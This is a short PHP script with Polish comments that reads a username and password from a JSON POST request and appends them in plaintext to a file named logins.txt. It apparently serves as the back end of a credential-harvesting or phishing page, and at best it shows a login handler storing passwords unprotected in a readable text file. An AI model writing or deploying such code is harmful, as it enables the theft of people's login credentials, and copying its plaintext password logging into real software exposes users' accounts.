<?php
// Odbierz dane logowania z zapytania POST
$loginData = json_decode(file_get_contents("php://input"));

$username = $loginData->username;
$password = $loginData->password;

// Zapisz dane logowania do pliku
$file = fopen("logins.txt", "a");
fwrite($file, "Username: $username Password: $password\n");
fclose($file);
?>
